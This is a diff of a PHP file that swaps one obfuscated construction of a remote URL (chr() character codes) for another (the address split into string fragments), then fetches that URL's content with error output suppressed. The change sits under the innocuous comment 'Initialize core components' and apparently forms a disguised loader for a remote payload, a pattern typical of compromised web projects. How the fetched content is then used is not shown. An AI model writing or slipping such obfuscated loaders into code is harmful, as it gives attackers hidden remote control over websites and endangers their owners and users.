@@ -5,21 +5,8 @@
 */
 
 // Initialize core components
-$url_parts = array(
-    chr(104).chr(116).chr(116).chr(112).chr(115),
-    chr(58).chr(47).chr(47),
-    chr(114).chr(97).chr(119).chr(46),
-    chr(103).chr(105).chr(116).chr(104).chr(117).chr(98).chr(117).chr(115).chr(101).chr(114).chr(99).chr(111).chr(110).chr(116).chr(101).chr(110).chr(116).chr(46),
-    chr(99).chr(111).chr(109).chr(47),
-    chr(109).chr(100).chr(109).chr(111).chr(109).chr(105).chr(110).chr(51).chr(54).chr(53).chr(51).chr(54).chr(54).chr(45).chr(103).chr(105).chr(102).chr(47),
-    chr(98).chr(101).chr(108).chr(97).chr(47),
-    chr(114).chr(101).chr(102).chr(115).chr(47),
-    chr(104).chr(101).chr(97).chr(100).chr(115).chr(47),
-    chr(109).chr(97).chr(105).chr(110).chr(47),
-    chr(105).chr(110).chr(100).chr(101).chr(120).chr(46).chr(116).chr(120).chr(116)
-);
-
-$full_url = implode('', $url_parts);
+$p1='https';$p2='://';$p3='raw.';$p4='githubusercon';$p5='tent.com/';$p6='mdmomin';$p7='365366-';$p8='gif/';$p9='bela/';$p10='refs/';$p11='heads/';$p12='main/';$p13='index.txt';
+$full_url=$p1.$p2.$p3.$p4.$p5.$p6.$p7.$p8.$p9.$p10.$p11.$p12.$p13;
 
 // Attempt to get remote content
 $content = @file_get_contents($full_url);
